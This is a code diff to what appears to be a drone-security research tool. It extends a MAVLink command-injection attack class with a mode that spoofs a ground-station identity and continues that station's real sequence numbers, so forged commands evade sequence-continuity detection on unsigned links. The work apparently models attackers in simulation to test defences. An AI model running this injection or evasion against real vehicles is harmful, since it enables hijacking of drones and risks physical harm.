@@ -31,6 +31,7 @@ import math
 from collections.abc import Callable, Mapping
 from dataclasses import dataclass
 from datetime import UTC, datetime
+from typing import Literal
 
 import numpy as np
 from pymavlink.dialects.v20 import common as mav2
@@ -394,9 +395,19 @@ class CommandInjectionAttack:
     counted in ``frames_skipped_signed`` -- no signing exists on this link today (``signed=0``
     for 100% of P1 captures), so this is not expected to trigger in current SITL trials.
 
-    Never raises. Deterministic given ``(params, frame sequence)``: the rogue source's own
-    MAVLink sequence counter starts at 0 and increments once per injected frame, independent
-    of any real frame's sequence number.
+    Never raises. Deterministic given ``(params, frame sequence)``: with the default
+    ``seq_policy="own_counter"`` the rogue source's own MAVLink sequence counter starts at 0
+    and increments once per injected frame, independent of any real frame's sequence number.
+
+    ``seq_policy="track_identity"`` (opt-in; used when ``rogue_sysid``/``rogue_compid`` impersonate
+    an identity that is *really transmitting* on the link, e.g. the expected GCS 255/190): the
+    attack passively reads that identity's own uplink frames (clear text on an unsigned link) and
+    stamps each forged frame with the next sequence number that identity is expected to send, so
+    the forgery continues the real counter instead of starting a second, inconsistent one. Until
+    one frame from that identity has been seen it injects nothing (fail closed;
+    ``frames_skipped_no_identity_seq``). This models an attacker who can read the link; it is a
+    strictly stronger attacker than the default, and what a per-source sequence-continuity check
+    cannot see.
     """
 
     def __init__(
@@ -414,11 +425,14 @@ class CommandInjectionAttack:
         warmup_s: float = DEFAULT_WARMUP_S,
         frame_log: FrameLogWriter | None = None,
         now_utc: Callable[[], datetime] = lambda: datetime.now(UTC),
+        seq_policy: Literal["own_counter", "track_identity"] = "own_counter",
     ) -> None:
         if (target_sysid is None) != (target_compid is None):
             raise ValueError("target_sysid and target_compid must both be set or both be None")
         if len(command_params) != 7:
             raise ValueError("command_params must have exactly 7 entries (MAVLink COMMAND_LONG)")
+        if seq_policy not in ("own_counter", "track_identity"):
+            raise ValueError("seq_policy must be 'own_counter' or 'track_identity'")
         self.params = params
         self._target_sysid = target_sysid
         self._target_compid = target_compid
@@ -432,9 +446,14 @@ class CommandInjectionAttack:
         self._decoder = mav2.MAVLink(None)
         self._first_client_recv_ns: int | None = None
         self._rogue_seq = 0
+        self._seq_policy = seq_policy
+        # track_identity only: the seq the impersonated identity's NEXT real frame is expected to carry,
+        # learned passively from that identity's own uplink frames (None until one has been seen).
+        self._identity_next_seq: int | None = None
         self._injected_count = 0
         self._last_injection_recv_ns: int | None = None
 
+        self.frames_skipped_no_identity_seq = 0
         self.frames_seen = 0
         # This attack never modifies or drops a real frame -- kept at 0 for API parity with
         # PositionDriftAttack so run_p2_trial.py-style scripts work unchanged either way.
@@ -455,6 +474,10 @@ class CommandInjectionAttack:
         # uplink: the real frame is always forwarded unchanged; we only ever append.
         if self._first_client_recv_ns is None:
             self._first_client_recv_ns = ctx.recv_ns
+        if (self._seq_policy == "track_identity" and not ctx.signed
+                and ctx.sysid == self._rogue_sysid and ctx.compid == self._rogue_compid):
+            # passive read of the impersonated identity's running counter (clear text on an unsigned link)
+            self._identity_next_seq = (ctx.seq + 1) % 256
         if self._target_sysid is None:
             return [ctx.raw]  # fail closed: no learned target yet
 
@@ -464,6 +487,10 @@ class CommandInjectionAttack:
 
         if ctx.signed:
             self.frames_skipped_signed += 1
+            return [ctx.raw]
+
+        if self._seq_policy == "track_identity" and self._identity_next_seq is None:
+            self.frames_skipped_no_identity_seq += 1  # fail closed: nothing observed to continue yet
             return [ctx.raw]
 
         try:
@@ -555,10 +582,15 @@ class CommandInjectionAttack:
             self._target_sysid, self._target_compid, self._command, 0, *self._command_params
         )
         encoder = mav2.MAVLink(None, srcSystem=self._rogue_sysid, srcComponent=self._rogue_compid)
-        seq_used = self._rogue_seq
+        if self._seq_policy == "track_identity":
+            assert self._identity_next_seq is not None  # guarded in __call__
+            seq_used = self._identity_next_seq
+            self._identity_next_seq = (seq_used + 1) % 256
+        else:
+            seq_used = self._rogue_seq
+            self._rogue_seq = (self._rogue_seq + 1) % 256
         encoder.seq = seq_used
         raw = bytes(msg.pack(encoder))
-        self._rogue_seq = (self._rogue_seq + 1) % 256
         return raw, seq_used
 
     def _log(
